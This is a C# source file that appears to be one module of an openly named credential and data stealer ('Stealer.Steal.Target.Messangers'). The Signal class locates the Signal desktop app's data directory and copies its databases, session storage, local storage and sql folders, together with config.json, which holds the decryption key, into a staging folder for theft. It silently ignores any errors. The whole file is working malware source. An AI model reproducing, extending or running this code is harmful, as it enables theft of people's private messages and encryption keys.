using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Signal
{
	private static string SignalPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");

	public static void Start()
	{
		try
		{
			if (Directory.Exists(SignalPath))
			{
				string sourceDir = Path.Combine(SignalPath, "databases");
				string sourceDir2 = Path.Combine(SignalPath, "Session Storage");
				string sourceDir3 = Path.Combine(SignalPath, "Local Storage");
				string sourceDir4 = Path.Combine(SignalPath, "sql");
				Counter.Signal = true;
				DynamicFiles.CopyDirectory(sourceDir, Path.Combine("Messengers", "Signal", "databases"));
				DynamicFiles.CopyDirectory(sourceDir2, Path.Combine("Messengers", "Signal", "Session Storage"));
				DynamicFiles.CopyDirectory(sourceDir3, Path.Combine("Messengers", "Signal", "Local Storage"));
				DynamicFiles.CopyDirectory(sourceDir4, Path.Combine("Messengers", "Signal", "sql"));
				DynamicFiles.WriteAllText(Path.Combine("Messengers", "Signal", "config.json"), File.ReadAllText(SignalPath + "\\config.json"));
			}
		}
		catch
		{
		}
	}
}
